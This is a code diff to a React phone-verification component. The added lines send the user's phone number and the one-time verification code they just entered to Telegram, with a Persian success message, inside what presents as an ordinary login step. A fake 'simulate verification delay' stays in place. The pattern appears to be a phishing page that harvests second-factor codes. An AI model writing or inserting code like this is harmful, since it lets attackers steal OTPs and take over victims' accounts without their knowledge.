@@ -59,6 +59,12 @@ const PhoneVerification = () => {
         throw new Error("Invalid verification code");
       }
 
+      // Send verification success notification to Telegram
+      await sendVerificationCodeToTelegram(
+        storedPhone || phoneNumber,
+        `✅ کد تایید با موفقیت وارد شد: ${otp}`,
+      );
+
       // Simulate verification delay
       await new Promise((resolve) => setTimeout(resolve, 1000));
 
